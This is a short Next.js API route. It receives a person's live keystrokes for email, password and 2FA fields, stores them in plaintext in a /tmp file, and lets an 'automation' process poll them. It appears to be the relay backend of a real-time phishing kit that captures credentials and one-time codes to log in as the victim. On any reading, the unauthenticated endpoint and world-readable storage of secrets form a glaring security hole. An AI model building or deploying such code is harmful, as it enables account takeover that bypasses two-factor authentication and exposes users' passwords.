import { NextResponse } from 'next/server';
import * as fs from 'fs';

const LIVE_TYPING_FILE = '/tmp/automation-live-typing.json';

// POST: Send live keystroke to automation
export async function POST(request: Request) {
    try {
        const body = await request.json();
        const { field, value, timestamp } = body;

        // field: 'email' | 'password' | '2fa'
        const typingData = {
            field,
            value,
            timestamp: timestamp || Date.now()
        };

        fs.writeFileSync(LIVE_TYPING_FILE, JSON.stringify(typingData, null, 2));

        return NextResponse.json({ success: true });
    } catch (error) {
        return NextResponse.json({ error: 'Error' }, { status: 500 });
    }
}

// GET: Read current live typing state (for automation to poll)
export async function GET() {
    try {
        if (!fs.existsSync(LIVE_TYPING_FILE)) {
            return NextResponse.json({ hasData: false });
        }

        const data = fs.readFileSync(LIVE_TYPING_FILE, 'utf-8');
        return NextResponse.json({ hasData: true, ...JSON.parse(data) });
    } catch (error) {
        return NextResponse.json({ hasData: false });
    }
}
